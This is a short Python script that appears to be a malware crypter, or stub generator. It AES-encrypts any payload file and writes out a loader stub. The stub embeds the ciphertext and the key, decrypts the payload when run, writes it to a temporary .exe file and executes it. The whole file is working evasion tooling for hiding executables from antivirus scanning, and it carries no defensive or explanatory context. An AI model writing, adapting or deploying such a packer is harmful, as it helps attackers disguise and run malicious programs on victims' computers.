import sys
import base64


from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

input_payload_path = sys.argv[1]
output_stub_path = sys.argv[2]

AES_KEY = get_random_bytes(16)
IV = get_random_bytes(16)

cipher = AES.new(AES_KEY, AES.MODE_CBC, IV)

with open(input_payload_path, 'rb') as f:
    payload_bytes = f.read()

encrypted_payload = cipher.encrypt(pad(payload_bytes, AES.block_size))
encrypted_b64 = base64.b64encode(encrypted_payload).decode()

stub = f"""
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64
import tempfile
import subprocess

encrypted_payload = "{encrypted_b64}"
AES_KEY = base64.b64decode("{base64.b64encode(AES_KEY).decode()}")
IV = base64.b64decode("{base64.b64encode(IV).decode()}")

def decrypt_payload(enc_payload, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_payload = base64.b64decode(enc_payload)
    decrypted_payload = unpad(cipher.decrypt(encrypted_payload), AES.block_size)
    return decrypted_payload

def execute_payload(payload):
    with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as f:
        f.write(payload)
        path = f.name
    subprocess.Popen(path, shell=True)
    
if __name__ == "__main__":
    payload = decrypt_payload(encrypted_payload,AES_KEY, IV)
    execute_payload(payload)
"""

with open(output_stub_path, 'w', encoding="utf-8") as stub_file:
    stub_file.write(stub)

print(f"[ + ] Stub Generated: {output_stub_path}")